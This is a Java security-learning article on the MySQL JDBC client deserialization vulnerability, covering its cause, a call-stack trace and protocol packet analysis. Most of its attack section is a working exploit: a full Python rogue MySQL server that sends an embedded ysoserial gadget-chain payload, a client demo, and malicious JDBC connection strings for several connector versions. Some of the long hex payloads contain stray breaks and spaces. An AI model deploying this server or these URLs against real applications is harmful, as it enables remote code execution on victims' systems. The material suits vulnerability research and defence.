# Java Security Learning—MySQL JDBC Deserialization Vulnerability

Author: H3rmesk1t

Data: 2022.03.21

# JDBC Introduction
[Java Database Connectivity](https://en.wikipedia.org/wiki/Java_Database_Connectivity) (JDBC) is an application programming interface (API) for the programming language Java, which defines how a client may access a database. It is a Java-based data access technology used for Java database connectivity. It is part of the Java Standard Edition platform, from Oracle Corporation. It provides methods to query and update data in a database, and is oriented towards relational databases. A JDBC-to-ODBC bridge enables connections to any ODBC-accessible data source in the Java virtual machine (JVM) host environment.

```java
jdbc://driver://host:port/database?Configuration name1=Configuration Value1&Configuration name2=Configuration Value2
```

# Vulnerability Principle
`BlackHat Europe 2019` topic [New Exploit Technique In Java Deserialization Attack](https://www.blackhat.com/eu-19/briefings/schedule/index.html#new-exploit-technique-in-java-deserialization-attack-17321) mentioned that when an attacker can control the `JDBC` connection setting item, then he can perform a deserialization attack of `ObjectInputStream.readObject` by setting it to a malicious `MySQL` server to perform a deserialization attack of `ObjectInputStream.readObject` thus `RCE`.

Specifically, when connecting to the MySQL server through JDBC, there will be several built-in SQL query statements to be executed. The result sets of two queries will be called ObjectInputStream.readObject for deserialization when the `MySQL` client is processed. If the attacker sets a malicious `MySQL` server to control the result sets of these two queries, and the attacker can control the `JDBC` connection setting item, then the `MySQL JDBC` client deserialization vulnerability can be triggered.

Two query statements that can be used:

````sql
SHOW SESSION STATUS
SHOW COLLATION
```

# Vulnerability reappears
Malicious MySQL server construction can be used as reference:
 - [MySQL Fake Server](https://github.com/fnmsd/MySQL_Fake_Server).
 - [Rogue Mysql Server](https://github.com/rmb122/rogue_mysql_server).

Or directly use the library that comes with `Python` to build it:

```python
# coding=utf-8
import socket
import binascii
import os

greeting_data="4a0000000a352e372e313900080000000463b452623342c2d00ffff7080200ff811500000000000000000000000000000000000000000000000000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f706173776f726400"
response_ok_data="07000002000000020000000"

def receive_data(conn):
    data = conn.recv(1024)
    print("[*] Receiveing ​​the package : {}".format(data))
    return str(data).lower()

def send_data(conn,data):
    print("[*] Sending the package : {}".format(data))
    conn.send(binascii.a2b_hex(data))

def get_payload_content():
    #The content of the file is generated using ysoserial. Use rules: java -jar ysoserial [Gadget] [command] > payload
    file= r'payload'
    if os.path.isfile(file):
        with open(file, 'rb') as f:
            payload_content = str(binascii.b2a_hex(f.read()), encoding='utf-8')
        print("open success")

    else:
        print("open false")
        #calc
        payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c00000000023f4000000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b6 57976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e 6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f547261 6e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d6 5727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f7 26d65723bbd562af1d8341899020000787000000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c00 0969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000000000000000000000000000000000000000000000000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e7 66f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b695061
72616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02 0000787000000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a9902000078700000000007400096 765744d6574686f647571007e001b0000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e0013 7571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a6563740000000000 000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200007870000000017400 0463616c63740004657865637571007e001b000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f7818738020 00149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173 684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000000007708000000010000000000000787878'
    return payload_content

# Main logic
def run():

    While 1:
        conn, addr = sk.accept()
        print("Connection come from {}:{}".format(addr[0],addr[1]))

        # 1. Send the first greeting message first
        send_data(conn, greeting_data)

        While True:
            # Login authentication process simulation 1. The client sends request login message 2. The server responds to response_ok
            receive_data(conn)
            send_data(conn,response_ok_data)

            #Other Processes
            data=receive_data(conn)
            #Query some configuration information, and will send your own version number
            if "session.auto_increment_increment" in data:
                _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f0015000000008a0000000002a0000003036465666 00000146368617261637465725f7365745f636c69656e74000c21000c00000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e6 56374696f6e000c21000c00000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00 000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f00000260000070364656600000010636f6c6c6174696f6e5f73657 2766572000c21003300000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c21000000000fd00001f0000290000009036465660000001369 6e7465726163746976655f74696d656f7574000c3f001500000008a000000001d00000a036465660000000076c6963656e7365000c210009000000fd00001f00002c0000000 b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000028000000c03646566000000126d61785f616c6c6f7765645f 7061636b6574000c3f001500000008a000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f00150000000008a000000002600000e036 465660000001071756572795f63616368655f73697a65000c3f001500000008a000000002600000f036465660000001071756572795f63616368655f74797065000c2100 09000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7 a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e 73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f00150000008a0000000000000 0020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c0131073431393433303402 36300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f4441544 52c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e4749 4e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'
                send_data(conn,_payload)
                data=receive_data(conn)
            elif "show warnings" in data:
                _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a000003036465660
000004436f6465000c3f000400000003a100000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726 e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656 420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f74797065272069732 06465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'
                send_data(conn, _payload)
                data = receive_data(conn)
            if "set names" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "set character_set_results" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "show session status" in data:
                mysql_data = '0100000102'
                mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc90000000000'
                mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc90000000000'
                # Get payload
                payload_content=get_payload_content()
                # Calculate the payload length
                payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)
                payload_length_hex = payload_length[2:4] + payload_length[0:2]
                # Calculate the packet length
                data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)
                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]
                mysql_data += data_len_hex + '04' + 'fbfc' + payload_length_hex
                mysql_data += str(payload_content)
                mysql_data += '07000005fe000022000100'
                send_data(conn, mysql_data)
                data = receive_data(conn)
            if "show warnings" in data:
                payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a00000303646566000000004436f6465000c3f000400000003a100000001d0000403646566000000074d657373616765000c210000060000fd01001f00006d00005044e6f74650431313 035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'
                send_data(conn, payload)
            break


if __name__ == '__main__':
    HOST ='0.0.0.0'
    PORT = 9999

    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #When the socket is closed, the port number used by the local socket can be reused immediately. In order to experiment, you don't have to wait for a long time.
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk.bind((HOST, PORT))
    sk.listen(1)

    print("start fake mysql server listening on {}:{}".format(HOST,PORT))

    run()
```

`Demo` code for `JDBC` connection:

```java
package org.h3rmesk1t.MySQLJDBC;

import java.sql.Connection;
import java.sql.DriverManager;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/23 8:55 am
 */
public class Demo {

    public static void main(String[] args) throws Exception {

        Class.forName("com.mysql.jdbc.Driver");

        // mysql-connector-java 5.x
        // String jdbcUrl = "jdbc:mysql://127.0.0.1:9999/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true";

        // mysql-connector-java 8.x
        String jdbcUrl = "jdbc:mysql://127.0.0.1:9999/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true";

        String username = "root";
        String password = "20010728";
        Connection connection = DriverManager.getConnection(jdbcUrl, username, password);
    }
}
```

Parameter description:
 - `queryInterceptors`: A comma-segmented `Class` list (the class that implements the `com.mysql.cj.interceptors.QueryInterceptor` interface), executes between `Query` to affect the results.
 - `autoDeserialize`: Automatically detect and deserialize objects that exist in the `BLOB` field.

Then use `ysoserial` to generate `Payload` of `CC7`, and
After running the malicious `MySQL` server for listening, you can see that the command was successfully executed.

<div align=center><img src="./images/1.png"></div>

# Vulnerability Analysis
`JDBC` is a Java API for executing `SQL` statements, which can provide unified access to a variety of relational databases.

<div align=center><img src="./images/2.png"></div>

Set a breakpoint at `Connection connection = DriverManager.getConnection(jdbcUrl, username, password);`, and enter the deserialization trigger point `ResultSetImpl#getObject` method. The stack call information is as follows:

```java
getObject:1314, ResultSetImpl (com.mysql.cj.jdbc.result)
resultSetToMap:46, ResultSetUtil (com.mysql.cj.jdbc.util)
populateMapWithSessionStatusValues:87, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)
preProcess:105, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)
preProcess:76, NoSubInterceptorWrapper (com.mysql.cj)
invokeQueryInterceptorsPre:1137, NativeProtocol (com.mysql.cj.protocol.a)
sendQueryPacket:963, NativeProtocol (com.mysql.cj.protocol.a)
sendQueryString:914, NativeProtocol (com.mysql.cj.protocol.a)
execSQL:1150, NativeSession (com.mysql.cj)
setAutoCommit:2064, ConnectionImpl (com.mysql.cj.jdbc)
handleAutoCommitDefaults:1382, ConnectionImpl (com.mysql.cj.jdbc)
initializePropsFromServer:1327, ConnectionImpl (com.mysql.cj.jdbc)
connectOneTryOnly:966, ConnectionImpl (com.mysql.cj.jdbc)
createNewIO:825, ConnectionImpl (com.mysql.cj.jdbc)
<init>:455, ConnectionImpl (com.mysql.cj.jdbc)
getInstance:240, ConnectionImpl (com.mysql.cj.jdbc)
connect:207, NonRegisteringDriver (com.mysql.cj.jdbc)
getConnection:664, DriverManager (java.sql)
getConnection:247, DriverManager (java.sql)
main:24, Demo (org.h3rmesk1t.MySQLJDBC)
```

<div align=center><img src="./images/9.png"></div>

In the called `ResultSetImp#getObject` function, both `case BIT` and `case BLOB` in the `switch` conditional statement have deserialization operations. `BIT` and `BLOB` are both data formats in `MySQL`, including other `case` samples, and are also some data types.
 - `BLOB`: `BLOB` is a binary long text data with a size of `0-65535 bytes`.
 - `BIT`: The `BIT` data type is used to store `bit` values. `BIT(M)` means that `M` can store `M`bit`, and the values ​​range from `1` to `64`. If the `bit` value is manually specified, you can use the `b'value'` format, such as `b'110'` and `b'10000000'` represent `6` and `128` respectively.

<div align=center><img src="./images/3.png"></div>

<div align=center><img src="./images/4.png"></div>

After determining that the type of `MySQL` is `BLOB` and is binary data, the corresponding bytecode data is obtained from the `MySQL` server. After obtaining the bytecode data from the `MySQL` server, determine whether `autoDeserialize` is `true` or not, then judge the content of `data`. When `data` meets the first position as `-84` and the second position as `-19` (the magic header of the serialized content of `Java`) is used to deserialize `data`, and finally call `readObject` to trigger the deserialization vulnerability.

Trace back along the stack call information. During the process of `JDBC connecting to the database, `ServerStatusDiffInterceptor` is an interceptor. When setting the attribute `queryInterceptor` to `ServerStatusDiffInterceptor` in the `JDBC URL`, executing the query statement will call the `preProcess` and `postProcess` methods of the interceptor, and then call the `ServerStatusDiffInterceptor#populateMapWithSessionStatusValues` method to execute the `SHOW SESSION STATUS` command to query, and then when processing the result, it will call `resultSetToMap`. In turn, it triggers `ResultSetImp#getObject`.

<div align=center><img src="./images/7.png"></div>

<div align=center><img src="./images/8.png"></div>

<div align=center><img src="./images/5.png"></div>

<div align=center><img src="./images/6.png"></div>

Going further back is some basic processing operations of the `MySQL` connection.

# Malicious MySQL Server Script Analysis
Use `Wireshark` to catch packets to see what traffic is like, and the content `07000002000000020000000` is a simple `Response OK` packet.

<div align=center><img src="./images/10.png"></div>

`4a0000000a352e372e313900080000000463b452623342c2d00fff7080200ff811500000000000000000000000000000000000000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f706173776f726400` is a greeting message, just POST it.

<div align=center><img src="./images/11.png"></div>

`show session status` belongs to the `request Query` message. The response packets for query packets can be divided into four types: `ERR Packet`, `OK Packet`, `Protocol::LOCAL_INFILE_Request`, and `ProtocolText::Resultset`. The above `Response OK` packet is `OK packet`, and this part mainly uses the result set packet. Reference [ProtocolText::Resultset](https://dev.mysql.com/doc/internals/en/protocoltext-resultset.html),

A result set response packet is divided into four data segments, and the structure of the data segments is also similar, with length (3 bytes), sequence number (1 byte), protocol data (different protocol data):
 - Data segment 1: Explain how many columns there are in the following result set;
 - Data segment 2: column definition;
 - Data segment 3: `EOF` package;
 - Data segment 4: Line data (`Payload`).

<div align=center><img src="./images/12.png"></div>

# Other Payload
## ServerStatusDiffInterceptor triggers
### 8.x

```java
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc
```

### 6.x
The attribute names are different, change `queryInterceptors` to `statementInterceptors`.

```java
jdbc:mysql://1
27.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc
```

### >= 5.1.11
There is no `cj` in the package name.

```java
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc
```

### 5.x <= 5.1.10
The same as `>=5.1.11`, but the query needs to be executed after connection.

## detectCustomCollations trigger
### 5.1.29 - 5.1.40

```java
jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc
```

### 5.1.28 - 5.1.19

```java
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&user=yso_JRE8u20_calc
```

# refer to
 - [MySQL JDBC Deserialization Vulnerability](https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86)
 - [MySQL JDBC Client Deserialization Vulnerability Analysis](https://www.anquanke.com/post/id/203086)